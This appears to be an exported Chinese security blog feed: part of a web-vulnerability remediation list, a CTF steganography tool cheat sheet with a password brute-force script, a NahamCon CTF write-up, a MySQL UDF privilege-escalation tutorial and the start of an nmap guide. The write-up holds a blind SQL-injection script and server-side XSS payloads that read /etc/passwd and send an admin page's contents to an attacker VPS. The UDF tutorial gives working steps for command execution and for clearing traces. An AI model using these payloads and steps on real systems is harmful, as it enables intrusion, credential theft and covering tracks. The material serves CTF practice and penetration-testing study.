<p>2、在一些操作时可以使用session对用户的身份进行判断和控制</p>
<h2 id="13未授权访问">13.未授权访问</h2>
<p><strong>漏洞描述</strong></p>
<p>由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p>
<p><strong>修复建议</strong></p>
<p>1、页面进行严格的访问权限的控制以及对访问角色进行权限检查。</p>
<p>2、可以使用session对用户的身份进行判断和控制。</p>
<h2 id="14列目录">14.列目录</h2>
<p><strong>漏洞描述</strong></p>
<p>由于web服务器配置不当，开启了目录浏览，攻击者可获得服务器上的文件目录结构，获取敏感文件。</p>
<p><strong>修复建议</strong></p>
<p>1、通过修改配置文件，禁止中间件（如IIS、apache、tomcat）的文件目录索引功能</p>
<p>2、设置目录访问权限</p>
<h2 id="15php反序列化">15.PHP反序列化</h2>
<p><strong>漏洞描述</strong></p>
<p>php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p>
<p>可参考：<a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p>
<p><strong>修复建议</strong></p>
<p>1、对传入的对象进行严格的过滤检查</p>
<p>2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</p>
<h2 id="16http-slow拒绝服务攻击">16.http slow拒绝服务攻击</h2>
<p><strong>漏洞描述</strong></p>
<p>按照设计，HTTP协议要求服务器在处理之前完全接收请求。 如果HTTP请求没有完成，或者传输速率非常低，服务器会保持其资源忙于等待其余数据。如果服务器保持太多的资源请求和处理，这将造成一个拒绝服务。严重者一台主机即可让web运行缓慢甚至是崩溃。</p>
<p><strong>修复建议</strong></p>
<p>对于 Apache 可以做以下优化（其他服务器原理相同）：</p>
<p>1、设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率</p>
<p>2、增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.</p>
<p>3、默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接</p>
<h2 id="17crlf注入">17.CRLF注入</h2>
<p><strong>漏洞描述</strong></p>
<p>CRLF 是“回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。</p>
<p><strong>修复建议</strong></p>
<p>1、过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。</p>
<h2 id="18ldap注入">18.LDAP注入</h2>
<p><strong>漏洞描述</strong></p>
<p>由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。</p>
<p><strong>修复建议</strong></p>
<p>对用户的输入内容进行严格的过滤。</p>
<h2 id="19url-跳转">19.URL 跳转</h2>
<p><strong>漏洞描述</strong></p>
<p>有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。</p>
<p><strong>修复建议</strong></p>
<p>1、在进行页面跳转前校验传入的URL是否为可信域名。</p>
<p>2、白名单规定跳转链接</p>
<h2 id="20明文传输">20.明文传输</h2>
<p><strong>漏洞描述</strong></p>
<p>用户登录过程中使用明文传输用户登录信息，若用户遭受中间人攻击时，攻击者可直接获取该用户登录账户，从而进行进一步渗透。</p>
<p><strong>修复建议</strong></p>
<p>1、用户登录信息使用加密传输，如密码在传输前使用安全的算法加密后传输，可采用的算法包括：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。</p>
<p>2、使用https来保证传输的安全。</p>
<h2 id="21网页木马">21.网页木马</h2>
<p><strong>漏洞描述</strong></p>
<p>经渗透测试发现目标站点存在webshell，攻击者可直接爆破口令使用木马，非常低成本的进行恶意操作。</p>
<p><strong>修复建议</strong></p>
<p>1、确认并删除木马文件，并进行本地文件漏洞扫描排查是否还存在有其他木马。</p>
<p>2、发现并及时修复已存在的漏洞。</p>
<p>3、通过查看日志、服务器杀毒等安全排查，确保服务器未被留下后门</p>
<h2 id="22备份文件泄露">22.备份文件泄露</h2>
<p><strong>漏洞描述</strong></p>
<p>网站备份文件或、敏感信息文件存放在某个网站目录下，攻击者可通过文件扫描等方法发现并下载该备份文件，导致网站敏感信息泄露。</p>
<p><strong>修复建议</strong></p>
<p>1、不在网站目录下存放网站备份文件或敏感信息的文件。</p>
<p>2、如需存放该类文件，请将文件名命名为难以猜解的无规则字符串。</p>
<h2 id="23敏感信息泄露">23.敏感信息泄露</h2>
<p><strong>漏洞描述</strong></p>
<p>在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p>
<p><strong>修复建议</strong></p>
<p>1、如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。</p>
<p>2、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</p>
<p>3、在服务器端对相关敏感信息进行模糊化处理。</p>
<p>4、对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。</p>
<h2 id="24短信邮件轰炸">24.短信/邮件轰炸</h2>
<p><strong>漏洞描述</strong></p>
<p>由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉。</p>
<p><strong>修复建议</strong></p>
<p>在服务器限制发送短信或邮件的频率，如同一账号1分钟只能发送1次短信或邮件，一天只能发送3次。</p>
<h2 id="25phpinfo信息泄漏">25.phpinfo信息泄漏</h2>
<p><strong>漏洞描述</strong></p>
<p>Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息，造成服务器信息泄露，为攻击提供有利的信息。</p>
<p><strong>修复建议</strong></p>
<p>1、删除phpinfo 函数。</p>
<p>2、若文件无用可直接删除。</p>
<h2 id="26iis短文件名泄露漏洞">26.IIS短文件名泄露漏洞</h2>
<p><strong>漏洞描述</strong></p>
<p>Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，<a href="http://xn--IIS-x68dp7r1pg48kyjm70ki32b.Net">或对IIS服务器中的.Net</a> Framework进行拒绝服务攻击。</p>
<p>攻击者可通过该漏洞尝试获取网站服务器文件的文件名，达到获取更多信息来入侵服务器的目的。</p>
<p><strong>修复建议</strong></p>
<p>修改Windows配置，关闭短文件名功能。</p>
<p>1.关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。</p>
<p>2.如果是虚拟主机空间用户,可采用以下修复方案：</p>
<p>1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。</p>
<p>2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 — Web 服务扩展 - <a href="http://ASP.NET">ASP.NET</a> 选择禁止此功能。</p>
<p>3）升级net framework 至4.0以上版本。</p>
<p>3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。</p>
<h2 id="27应用程序错误信息泄露">27.应用程序错误信息泄露</h2>
<p><strong>漏洞描述</strong></p>
<p>攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p>
<p><strong>修复建议</strong></p>
<p>1、自定义错误页面或使用统一的错误页面提示。</p>
<h2 id="28apache-tomcat默认文件">28.Apache Tomcat默认文件</h2>
<p><strong>漏洞描述</strong></p>
<p>Apache Tomcat默认样例文件没有删除或限制访问，可能存在cookie、session伪造，进行后台登录操作</p>
<p><strong>修复建议</strong></p>
<p>1、删除样例文件</p>
<p>2、限制文件访问权限</p>
<h2 id="29crossdomainxml-配置不当">29.Crossdomain.xml 配置不当</h2>
<p><strong>漏洞描述</strong></p>
<p>网站根目录下的 crossdomain.xml 文件指明了远程Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。如果配置不当，可能导致遭受跨站请求伪造（CSRF）攻击。</p>
<p><strong>修复建议</strong></p>
<p>对于不需要从外部加载资源的网站，在 crossdomain.xml 文件中更改allow-access-from的domain属性为域名白名单。</p>
<h2 id="30目标服务器启用了不安全-http-方法">30.目标服务器启用了不安全 HTTP 方法</h2>
<p><strong>漏洞描述</strong></p>
<p>目标服务器启用了不安全的传输方法，如PUT、TRACE、DELETE、MOVE等，这些方法表示可能在服务器上使用了 WebDAV，由于dav方法允许客户端操纵服务器上的文件，如上传、修改、删除相关文件等危险操作，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p>
<p><strong>修复建议</strong></p>
<p>1、关闭不安全的传输方法，只开启POST、GET方法。</p>
<p>2、如果服务器不使用 WebDAV 可直接禁用，或为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。</p>
<h2 id="31weblogic-ssrf服务器请求伪造">31.weblogic SSRF服务器请求伪造</h2>
<p><strong>漏洞描述</strong></p>
<p>目标存在weblogic SSRF服务器请求伪造漏洞。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。Weblogic中间件默认带有“UDDI 目录浏览器”且为未授权访问，通过该应用，可进行无回显的SSRF请求。攻击者可利用该漏洞对企业内网进行大规模扫描，了解内网结构，并可能结合内网漏洞直接获取服务器权限。</p>
<p><strong>修复建议</strong></p>
<p>1、若不影响业务则可删除uddiexplorer文件夹</p>
<p>2、限制uddiexplorer应用只能内网访问</p>
<h2 id="32apache-struts2-远程代码执行漏洞s2-019">32.Apache Struts2 远程代码执行漏洞（S2-019）</h2>
<p><strong>漏洞描述</strong></p>
<p>Apache Struts2的“Dynamic MethodInvocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，如果未关闭此机制将导致远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p>
<p><strong>修复建议</strong></p>
<p>1、目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载。</p>
<p>2、或者手工设置struts.xml文件&lt;constantname=&quot;struts.enable.DynamicMethodInvocation&quot;value=“false”/&gt;</p>
<h2 id="33apache-struts2-远程代码执行漏洞s2-037">33.Apache Struts2 远程代码执行漏洞（S2-037）</h2>
<p><strong>漏洞描述</strong></p>
<p>Apache Struts2在使用REST插件时，攻击者可以绕过动态方法执行的限制，调用恶意表达式执行远程代码。</p>
<p><strong>修复建议</strong></p>
<p>建议用户到官方获取最新补丁或者最新版本程序。</p>
<h2 id="34apache-struts2-devmode-远程代码执行漏洞">34.Apache Struts2 DevMode 远程代码执行漏洞</h2>
<p><strong>漏洞描述</strong></p>
<p>为了便于开发人员调试程序，Struts2提供了一个devMode模式，可以方便查看程序错误以及日志等信息。当Struts2中的devMode模式设置为true时，存在严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
<p><strong>修复建议</strong></p>
<p>建议用户到官方获取最新补丁或者最新版本程序。</p>
<p>或者将struts.properties中的devMode设置为false，或是在struts.xml中添加如下代码： &lt;constant name=&quot;struts.devMode&quot;value=“false”/&gt;。</p>
<h2 id="35apache-struts2-远程代码执行漏洞s2-045">35.Apache Struts2 远程代码执行漏洞（S2-045）</h2>
<p><strong>漏洞描述</strong></p>
<p>Apache Struts2的Jakarta Multipartparser插件存在远程代码执行漏洞，漏洞编号为CVE-2017-5638。攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发该漏洞，导致远程执行代码。</p>
<p><strong>修复建议</strong></p>
<p>检测方式查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p>
<p>1、建议用户到官方获取最新补丁或者最新版本程序。</p>
<p>2、更新至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。</p>
<p>3、临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p>
<p>4、修改WEB-INF/classes目录下的配置</p>
<p>在WEB-INF/classes目录下的struts.xml中的struts 标签下添加</p>
<p>&lt;constantname=”struts.custom.i18n.resources”value=”global”/&gt;；</p>
<p>在WEB-INF/classes/目录下添加global.properties，文件内容如下:</p>
<p>struts.messages.upload.error.InvalidContentTypeException=1</p>
<h2 id="36apache-struts2-远程代码执行漏洞s2-033">36.Apache Struts2 远程代码执行漏洞（S2-033）</h2>
<p><strong>漏洞描述</strong></p>
<p>Apache Struts2在开启动态方法调用（DynamicMethod Invocation）的情况下，攻击者使用REST插件调用恶意表达式可以远程执行代码。</p>
<p><strong>修复建议</strong></p>
<p>1、用户到官方获取最新补丁或者最新版本程序。</p>
<p>2、或者在允许的情况下禁用动态方法调用（Dynamic Method Invocation），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>Web工具包</tag>
      </tags>
  </entry>
  <entry>
    <title>misc部分解题软件命令记录</title>
    <url>/2022/01/23/misc%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>misc部分工具解题的命令记录，方便后续使用到的时候能找到，所以记录一下。</p>
<span id="more"></span>
<h1 id="f5隐写">F5隐写</h1>
<p>全称是F5-steganography</p>
<p>1.进入该文件夹后，需要将隐写的图片复制到文件夹里然后在空白处打开终端</p>
<p>2.java Extract图片的绝对路径是/123.jpg -p 123（这个-p后面输入的是密码，多半题目密码就是图片名，还有一定要用绝对路径）</p>
<p>3.这个时候在文件夹中找到并打开output.txt文件即可得到</p>
<h2 id="steghide工具">steghide工具</h2>
<p>将post.txt文件隐藏到xxx.jpg中：<br>
steghide embed -cf xxx.jpg -ef post.txt -p 123456（不加-p参数 不设置密码 ）<br>
从xxx.jpg解出post.txt:<br>
steghide extract -sf xxx.jpg （图片路径）-p 123456（-p 密码）<br>
steghide也可以用来爆破密码：<br>
需要shell脚本：`#<a href="http://bruteStegHide.sh">bruteStegHide.sh</a></p>
<pre><code class="hljs plaintext">   #bruteStegHide.sh
   #!/bin/bash

for line in `cat $2`;do
steghide extract -sf $1 -p $line &gt; /dev/null 2&gt;&amp;1
if [[ $? -eq 0 ]];then
echo &#x27;password is: &#x27;$line
exit
fi
done</code></pre>
<p>用法：<br>
# ./bruteStegHide.sh test.jpg passwd.txt<br>
剩下的密码就出来了。</p>
<h2 id="文件分离工具binwalkforemost">文件分离工具（binwalk,foremost）</h2>
<h2 id="binwalk">binwalk</h2>
<p>binwalk -D “archive:zip” -D “image:jpg” hehe.jpg 可以直接分离文件</p>
<blockquote>
<p>也可以使用dd命令分离文件，如:<code>dd if=hehe.jpg of=hehe1.zip bs=1 skip=54163</code></p>
</blockquote>
<h2 id="foremost的使用">foremost的使用</h2>
<p>先用<code>foremost -h</code>检查一下是否已经安装，若安装之后会显示</p>
<pre><code class="hljs plaintext">$ foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t &lt;type&gt;] [-s &lt;blocks&gt;] [-k &lt;size&gt;] 
    [-b &lt;size&gt;] [-c &lt;file&gt;] [-o &lt;dir&gt;] [-i &lt;file] 

-V  - 显示版权信息并退出
-t  - 指定文件类型.  (-t jpeg,pdf ...) 
-d  -打开间接块检测 (针对UNIX文件系统) 
-i  - 指定输入文件 (默认为标准输入) 
-a  - 写入所有的文件头部, 不执行错误检测(损坏文件) 
-w  - 向磁盘写入审计文件，不写入任何检测到的文件
-o  - 设置输出目录 (默认为为输出)
-c  - 设置配置文件 (默认为 foremost.conf)
-q  - 启用快速模式. 在512字节边界执行搜索.
-Q  - 启用安静模式. 禁用输出消息. 
-v  - 详细模式. 向屏幕上记录所有消息。</code></pre>
<p>使用方法就是将图片放进foremost目录下，输入命令：</p>
<pre><code class="hljs plaintext">foremost -i xxx.jpg</code></pre>
<p>在目录下会出现一个output文件夹，结果就在里面。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>nahamcon</title>
    <url>/2022/05/03/nahamcon/</url>
    <content><![CDATA[<p>一个外国比赛记录一下web题目</p>
<span id="more"></span>
<h1 id="flaskmetal-alchemist">Flaskmetal Alchemist</h1>
<p><img src="https://z4a.net/images/2022/05/03/image.png" alt></p>
<p>在附件里看到有版本号<img src="https://z4a.net/images/2022/05/03/image3dac2e8ebba12bd0.png" alt></p>
<p>同时发现flag在Flag里面<img src="https://z4a.net/images/2022/05/03/imagea6ad23a2f8b33341.png" alt></p>
<p><img src="https://z4a.net/images/2022/05/03/imagecdf69a9ead10c0fa.png" alt></p>
<p>在这上面看到like与两个%包裹用户输入的数据，这里无法进行注入，往下看到有个order_by这里可控存在注入。</p>
<p><a href="https://github.com/sqlalchemy/sqlalchemy/issues/4481">SQLAlchemy 到 1.2.17 和 1.3.x 到 1.3.0b2 允许通过 order_by 参数进行 SQL 注入</a></p>
<p><img src="https://z4a.net/images/2022/05/03/imagee9f9bcc3db4b4fd3.png" alt></p>
<pre><code class="hljs plaintext">import requests
import time

s=&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#123;&#125;_-[]()!~QWERTYUIOPASDFGHJKLZXCVBNM&#x27;
url = &quot;http://challenge.nahamcon.com:30678/&quot;

flag=&#x27;&#x27;
for i in range(1,40):
 for a in s:
    payload=&quot;case when(substr((select flag from Flag),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;) then randomblob(1) else 2 end limit 1,1&quot;.format(i,a)
    data = &#123;&quot;search&quot;:&quot;Li&quot;,&quot;order&quot;:payload&#125;
    r=requests.post(url,data=data)
    if &quot;Beryllium&quot; not in r.text:
        flag+=a
        print(flag)
        break
    else:
        pass</code></pre>
<p><img src="https://z4a.net/images/2022/05/03/image28aa6b56f2c568a3.png" alt></p>
<h1 id="hacker-ts">Hacker Ts</h1>
<p><img src="https://z4a.net/images/2022/05/03/image15dc18bbcd2ae3be.png" alt></p>
<p><img src="https://z4a.net/images/2022/05/03/imagecfa6cf8b13e1bc37.png" alt></p>
<p>没有注入，插了一下发现应该是考察的xss，同时有admin，但是打不开<img src="https://z4a.net/images/2022/05/03/image625c2a9f5521b2a0.png" alt></p>
<p>你输入啥就会在衣服上打印啥<img src="https://z4a.net/images/2022/05/03/image41c8457a984f5765.png" alt></p>
<p>尝试了一般的恶意代码但是没啥用。</p>
<p>这个文章给了灵感，<a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf">服务器端 XSS（动态 PDF）</a>，存在一个服务端xss，利用本地文件读取</p>
<pre><code class="hljs plaintext">&lt;script&gt;
x=new XMLHttpRequest;
x.onload=function()&#123;document.write(btoa(this.responseText))&#125;;
x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();
&lt;/script&gt;</code></pre>
<p><strong>payload</strong></p>
<pre><code class="hljs plaintext">&lt;script&gt;
    x=new XMLHttpRequest;
    x.onload=function()&#123;  
    document.write(this.responseText)
&#125;;
    x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);
    x.send();
&lt;/script&gt;</code></pre>
<p>执行报错<img src="https://z4a.net/images/2022/05/03/imagead98f5c414eaed6b.png" alt></p>
<p>使用了 wkhtmltoimage,查询得到wkhtmltopdf,在0.12.6版本默认禁止读取本地文件，</p>
<p>不过还可以利用 <strong>XMLHttpRequest</strong> 去让服务器访问/admin，然后将访问的内容返回到vps上</p>
<pre><code class="hljs plaintext">&lt;script&gt;
x=new XMLHttpRequest();
x.open(&quot;GET&quot;,&quot;http://localhost:5000/admin&quot;);
x.onload=function()&#123;var i = new Image(); i.src = &quot;https://&lt;vps&gt;/?c=&quot; + btoa(this.responseText)&#125;;
x.send();
&lt;/script&gt;</code></pre>
<p>把payload urlencode之后再用,然后正常情况下应该在vps下监听到，但是竟然直接回显了</p>
<p><img src="https://z4a.net/images/2022/05/03/image82b45dec01c62465.png" alt></p>
<p><img src="https://z4a.net/images/2022/05/03/imageb373dfcd7a1e9431.png" alt></p>
<p>flag{461e2452088eb397b6138a5934af6231}</p>
<p>涉及知识点</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/conflicting/Web/API/XMLHttpRequest/load_event">XMLHttpRequestEventTarget.onload</a></p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql之udf提权</title>
    <url>/2023/03/07/mysql%E4%B9%8Budf%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<p>mysql之udf提权</p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<h2 id="udf简介">UDF简介</h2>
<p><code>UDF (user defined function)</code>，即用户自定义函数。是通过添加新函数，对<code>MySQL</code>的功能进行扩充，就像使用本地函数如 <code>user()</code> 一样。</p>
<p>加载<code>udf</code>，示例中文件末为<code>.so</code>，则为<code>linux</code>系统，如果是<code>win</code>，则后缀为<code>dll</code></p>
<pre><code class="hljs plaintext">CREATE FUNCTION metaphon
  RETURNS STRING
  SONAME &#x27;udf_example.so&#x27;;</code></pre>
<p>查看存在的<code>udf</code></p>
<pre><code class="hljs plaintext">SELECT * FROM mysql.func;</code></pre>
<p>删除<code>udf</code></p>
<pre><code class="hljs plaintext">DROP FUNCTION metaphon;</code></pre>
<h1 id="提权思路一">提权思路(一)</h1>
<h2 id="when">When</h2>
<p>在无<code>web</code>脚本执行权限，但是有<code>mysql root</code>执行的环境下，我们就可以通过<code>into dumpfile</code>函数导入<code>udf.dll</code>进行提权。有<code>web</code>脚本执行权限时，也可以直接上传<code>udf</code>提权脚本，快速搞定。</p>
<blockquote>
<p>总结一下就是需要有mysql的root权限，就可以尝试使用UDF提权</p>
</blockquote>
<p>这个第一个思路是针对没有web脚本执行的情况下进行的提权</p>
<p>若不确定是否是root权限可以使用命令查看一下</p>
<pre><code class="hljs plaintext">select * from mysql.user where user = substring_index(user(), &#x27;@&#x27;, 1)\G;</code></pre>
<h2 id="what">What</h2>
<blockquote>
<h5 id="数据库相关信息">数据库相关信息</h5>
</blockquote>
<p>既然使用<code>dumpfile</code>那么<code>secure_file_priv</code>肯定要设置为空的</p>
<blockquote>
<p>注意：secure_file_priv的值为NULL或者是存在值是不能利用UDF提权的，只有空值才行</p>
</blockquote>
<blockquote>
<p>在<code>mysql</code>配置文件中改即可</p>
</blockquote>
<pre><code class="hljs plaintext">mysql&gt; show variables like &#x27;%secure%&#x27;;   //查看可导出文件位置
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_auth      | OFF   |
| secure_file_priv |       |
+------------------+-------+
2 rows in set (0.00 sec)</code></pre>
<p>确认mysql安装位置</p>
<pre><code class="hljs plaintext">select @@basedir as basePath from dual ;

show variables like &#x27;%basedir%&#x27;;</code></pre>
<p>检查系统构架及<code>plugin</code>目录，通过主机版本及架构确认mysql位数来选用udf文件</p>
<pre><code class="hljs plaintext">mysql&gt; show variables like ’%compile%‘;
+---------------------------+----------------------------------------+
| Variable_name             | AMD64                                  |
+---------------------------+----------------------------------------+
| version_compile_machine   | AMD64                                  |
+---------------------------+----------------------------------------+
| version_compile_os        | Win32                                  |
+---------------------------+----------------------------------------+
1 row in set (0.00 sec)</code></pre>
<pre><code class="hljs plaintext">show variables like &quot;%plugin%&quot;;
+---------------+----------------------------------------+
| Variable_name | Value                                  |
+---------------+----------------------------------------+
| plugin_dir    |C:\phpStudy\MySQL\lib\plugin\           |
+---------------+----------------------------------------+</code></pre>
<h2 id="提权payload">提权payload</h2>
<p>提权payload在kali中的msf中就有</p>
<blockquote>
<p>/usr/share/metasploit-framework/data/exploits/mysql</p>
</blockquote>
<p>sqlmap里面也有</p>
<blockquote>
<p>sqlmap\data\udf\mysql</p>
<p>sqlmap自身UDF文件进行异或加密了，使用sqlmap解密一下再使用</p>
<p>python extra/cloak/cloak.py -d -i data/udf/mysql/windows/32/lib_mysqludf_sys.dll_</p>
</blockquote>
<p>用<code>010editor</code>打开后另存为十六进制文件，然后去掉空格，去掉换行，生成<code>payload</code></p>
<p>将生成的payload写入到plugin目录下</p>
<pre><code class="hljs plaintext">select ‘payload’ into dumpfile &#x27;D:/Programs/PHPStudy/MySQL/lib/plugin/udf.dll&#x27;;</code></pre>
<p>查看数据库版本，判断udf文件写入位置</p>
<pre><code class="hljs plaintext">select version();</code></pre>
<p>注意:mysql自身版本特性，我们将payload是要放在mysql的检索目录中，但是由于版本特性不同，目录也有所不同</p>
<pre><code class="hljs plaintext">1、 Mysql &lt; 5.0
导出路径随意。

2、 5.0 &lt;= Mysql &lt; 5.1
Win2000导出路径： C:/Winnt/udf.dll

其他Windows系统导出路径均为：C:/Windows/udf.dll或C:/Windows/system32/udf.dll

3、 Mysql &gt;= 5.1
Mysql安装目录的lib\plugin文件夹下，如果mysql安装时不选择完整安装或使用集成开发环境等情况下lib\plugin目录大概率是不存在的，需要自行创建。

##有web脚本执行权限的时候，可以直接上传该UDF文件，没有执行权限就提取十六进制这个方法</code></pre>
<h2 id="调用此提权udf">调用此提权UDF</h2>
<pre><code class="hljs plaintext">mysql&gt; create function sys_eval returns string soname &#x27;udf.dll&#x27;;
Query OK, 0 rows affected (0.00 sec)</code></pre>
<p>此时再去查看存在的UDF就能看到自己上传的这个UDF了</p>
<pre><code class="hljs plaintext">select * from mysql.func;
select sys_eval(‘net user’);</code></pre>
<p>至此就完成了UDF提权</p>
<h1 id="痕迹清除">痕迹清除</h1>
<p><strong>删除表</strong></p>
<pre><code class="hljs plaintext">drop table udf;</code></pre>
<p><strong>删除函数</strong></p>
<pre><code class="hljs plaintext">drop function sys_eval;</code></pre>
<h1 id="补充">补充</h1>
<p>UDF提权一般仅适用于windows系统，linux系统由于自身对plugin目录严格的写入权限，很难利用</p>
<p>参考博客链接:<a href="https://blog.csdn.net/qq_45290991/article/details/115716262">(96条消息) 20210415web渗透学习之Mysqludf提权（二）（胃肠炎住院期间转）_热热的雨夜的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>nmap常用操作</title>
    <url>/2022/04/11/nmap/</url>
    <content><![CDATA[<p><strong>nmap是扫描端口不可或缺的一个工具，在这里记录一下，方便后续使用!</strong></p>
<span id="more"></span>
<h3 id="nmap输出的端口状态">nmap输出的端口状态</h3>
<ol>
<li>Open（开放的）： 意味着目标机器上的应用程序正在该端口监听连接/报文</li>
<li>Filtered（被过滤的）：意味着防火墙，过滤器或者其他网络障碍阻止了该端口被访问，Nmap无法得知它的真实状态。当nmap收到icmp报文主机不可达报文或者目标主机无应答，常常会将目标主机的状态设置为filtered。</li>
<li>Closed（关闭的）：端口上面没有应用程序监听，但它们随时可能开放。</li>
<li>Unfiltered（未被过滤的）： 这种状态和filtered的区别在于：unfiltered的端口能被nmap访问，但是nmap根据返回的报文无法确定端口的开放状态，而filtered的端口不能被nmap访问。只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。</li>
<li>Open|filtered状态： 这种状态主要是nmap无法区别端口处于open状态还是filtered状态。 UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类。</li>
<li>Closed|filtered状态 ：这种状态主要出现在nmap无法区分端口处于closed还是filtered时。此状态只会出现在IP ID idle scan。</li>
</ol>
<h3 id="nmap语法">nmap语法</h3>
<p>我们在使用Nmap的时候大多是在命令行下进行的，即使是使用可视化Zenmap也是需要遵循Nmap固定的语法格式的。<br>
Nmap的固定语法格式如下：</p>
<pre><code class="hljs bash">nmap 【空格】【选项|多选项|协议】【空格】【目标】</code></pre>
<p>ps：<em>所有的选项与命令及选项参数都是用空格进行分割的，有时候选项与参数直接可以不用空格分割，如-p80，-p是选项，80是参数。为了使Nmap语法更加严谨，建议严格按照空格进行分割</em></p>
<h4 id="全面扫描">全面扫描：</h4>
<pre><code class="hljs bash">nmap -A 目标  //指定IP或域名的所有端口及其目标系统信息等，耗时会有点长。</code></pre>
